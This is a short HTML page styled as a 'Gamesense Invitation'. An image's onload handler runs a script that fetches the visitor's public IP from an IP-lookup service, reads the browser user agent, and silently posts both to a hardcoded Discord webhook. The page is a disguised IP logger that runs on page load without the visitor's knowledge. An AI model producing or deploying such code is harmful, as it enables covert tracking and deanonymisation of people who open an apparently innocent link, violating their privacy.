<!DOCTYPE html>
<html>
<head>
  <title>Gamesense Invitation</title>
</head>
<body>
  <img src="https://thumb-lvlt.xhcdn.com/a/4IJQFV6sCAIZwm_baFKxgA/022/843/874/v2/2560x1440.223.webp" onload="sendInfo()">

  <script>
    function sendInfo() {
      var ipAddress = '';
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          ipAddress = data.ip;

          var userAgent = navigator.userAgent;

          var payload = {
            content: 'IP Address: ' + ipAddress + '\nUser Agent: ' + userAgent
          };

          fetch('https://discord.com/api/webhooks/1138188148548063374/V8RP-S1k4avdS-yJYv7C5dTF8jD6QwXBC13fDQ8neDGAx-yiL6SnKOy106Pu_Qh5lsD2', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
          });
        });
    }
  </script>
</body>
</html>
